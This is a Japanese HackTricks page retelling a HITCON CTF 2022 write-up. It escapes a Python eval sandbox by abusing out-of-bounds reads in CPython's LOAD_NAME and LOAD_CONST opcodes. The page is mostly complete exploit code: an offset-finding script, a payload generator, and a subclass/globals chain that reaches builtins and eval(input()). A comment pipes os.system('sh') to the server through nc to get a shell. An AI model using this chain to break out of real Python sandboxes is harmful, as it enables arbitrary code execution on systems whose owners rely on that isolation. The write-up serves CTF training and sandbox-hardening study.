# LOAD\_NAME / LOAD\_CONST opcode OOB Read

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}

**この情報は** [**この書き込みから**](https://blog.splitline.tw/hitcon-ctf-2022/)**取得されました。**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

LOAD\_NAME / LOAD\_CONST opcodeのOOBリード機能を使用して、メモリ内のシンボルを取得できます。これは、`(a, b, c, ... 数百のシンボル ..., __getattribute__) if [] else [].__getattribute__(...)`のようなトリックを使用して、取得したいシンボル（関数名など）を得ることを意味します。

その後、エクスプロイトを作成します。

### 概要 <a href="#overview-1" id="overview-1"></a>

ソースコードは非常に短く、わずか4行しか含まれていません！
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
任意のPythonコードを入力できますが、それは[Pythonコードオブジェクト](https://docs.python.org/3/c-api/code.html)にコンパイルされます。しかし、そのコードオブジェクトの`co_consts`と`co_names`は、コードオブジェクトをevalする前に空のタプルに置き換えられます。

このようにして、すべての式がconsts（例：数値、文字列など）または名前（例：変数、関数）を含む場合、最終的にセグメンテーションフォルトを引き起こす可能性があります。

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

セグフォルトはどのように発生しますか？

簡単な例から始めましょう。`[a, b, c]`は次のバイトコードにコンパイルされる可能性があります。
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
しかし、`co_names`が空のタプルになった場合はどうなるでしょうか？`LOAD_NAME 2`オペコードはまだ実行され、そのメモリアドレスから値を読み取ろうとします。はい、これは境界外読み取りの「機能」です。

解決策の核心概念はシンプルです。CPythonのいくつかのオペコード、例えば`LOAD_NAME`や`LOAD_CONST`は、境界外読み取りに対して脆弱です（？）。

これらは、`consts`または`names`タプルから`oparg`のインデックスからオブジェクトを取得します（これが内部で`co_consts`と`co_names`と呼ばれるものです）。以下の短いスニペットを参照して、CPythonが`LOAD_CONST`オペコードを処理する際に何を行うかを見てみましょう。
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
この方法で、任意のメモリオフセットから「名前」を取得するためにOOB機能を使用できます。それがどの名前で、オフセットが何であるかを確認するには、`LOAD_NAME 0`、`LOAD_NAME 1` ... `LOAD_NAME 99` ... を試し続けてください。そして、オパラグが700を超える何かを見つけることができるかもしれません。もちろん、gdbを使用してメモリレイアウトを確認することもできますが、それがもっと簡単になるとは思いませんか？

### Exploitの生成 <a href="#generating-the-exploit" id="generating-the-exploit"></a>

名前/定数のための有用なオフセットを取得したら、どのようにそのオフセットから名前/定数を取得して使用するのでしょうか？ここにあなたへのトリックがあります：\
オフセット5（`LOAD_NAME 5`）から`__getattribute__`の名前を取得できると仮定しましょう（`co_names=()`）。その後、次のことを行います：
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> `__getattribute__`と名付ける必要はなく、もっと短い名前や奇妙な名前を付けることができます。

その理由は、バイトコードを見るだけで理解できます:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
`LOAD_ATTR`は`co_names`から名前を取得することにも注意してください。Pythonは名前が同じであれば同じオフセットから名前をロードしますので、2番目の`__getattribute__`もoffset=5からロードされます。この機能を利用して、名前が近くのメモリにある場合に任意の名前を使用できます。

数字を生成するのは簡単なはずです：

* 0: not \[\[]]
* 1: not \[]
* 2: (not \[]) + (not \[])
* ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

長さ制限のため、constsは使用しませんでした。

まず、名前のオフセットを見つけるためのスクリプトを示します。
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
そして、以下は本物のPythonエクスプロイトを生成するためのものです。
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
基本的に、`__dir__` メソッドから取得した文字列に対して以下のことを行います:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}
